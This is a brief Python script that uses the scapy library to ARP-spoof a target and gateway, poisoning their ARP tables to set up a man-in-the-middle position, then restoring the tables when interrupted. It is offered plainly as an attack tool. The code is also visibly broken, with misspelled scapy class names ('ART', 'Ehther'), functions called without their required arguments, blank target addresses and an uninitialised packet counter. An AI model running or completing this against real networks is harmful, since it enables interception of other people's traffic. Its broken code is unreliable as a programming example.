#!/usr/bin/env python

import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ART(pdst = ip)
    broadcast = scapy.Ehther(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count = 4, verbose = False)

try:
    while True:
        spoof("")
        spoof("")
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        # Python 3
        #print("\r[+] Packets sent: " + str(sent_packets_count), end = "")
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ......... Resetting ARP tables..... Please wait......")
    restore()
    restore()
    